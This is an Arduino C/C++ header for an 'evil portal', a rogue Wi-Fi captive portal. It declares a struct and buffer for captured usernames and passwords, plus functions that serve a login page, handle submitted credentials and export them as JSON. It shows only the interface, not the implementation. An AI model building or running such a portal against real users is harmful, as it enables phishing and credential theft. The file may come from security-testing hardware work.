#ifndef EVIL_PORTAL_H
#define EVIL_PORTAL_H

#include <Arduino.h>

#define MAX_CREDS 30

struct Credential {
    char     user[64];
    char     pass[64];
    uint32_t capturedAt;
};

extern Credential portalCreds[MAX_CREDS];
extern int        portalCredCount;

void    initEvilPortal();
void    runPortalDns();
void    setPortalEnabled(bool en);
bool    isPortalActive();
void    handlePortalSubmit(const String& user, const String& pass);
String  getCredsJson();
const char* getPortalHtml();
const char* getPortalSuccess();

#endif
